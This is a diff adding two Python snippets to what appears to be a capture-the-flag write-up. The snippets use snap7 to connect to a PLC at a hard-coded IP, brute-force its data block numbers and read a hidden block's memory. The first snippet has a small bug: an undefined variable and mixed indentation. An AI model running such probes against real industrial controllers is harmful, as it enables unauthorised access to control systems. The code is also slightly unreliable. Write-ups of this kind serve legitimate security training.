@@ -31,6 +31,32 @@ client.plc_stop()
 
 ## A Hidden Value
 
+````python3
+import snap7
+client = snap7.client.Client()
+client.connect("51.75.241.106", 0, 2, 33244)
+
+#guess the data block number in memory
+for i in range(5000):
+	try:
+            data = client.db_read(i, 0, 200)
+            print(f"[+] Read DB {i}, size of block 200: {data[:16]}...")
+            break
+        except Exception as e:
+            print(f"[X] Error on DB {i}, size of block {j}: {e}")
+
+client.disconnect()
+````
+
+````python3
+import snap7
+client = snap7.client.Client()
+client.connect("51.75.241.106", 0, 2, 33244)
+dbn, size = 6485, 200
+buffer = client.db_read(dbn, 0, size)
+print(buffer)
+````
+
 ---
 
 ## Old Proprietary Encryption
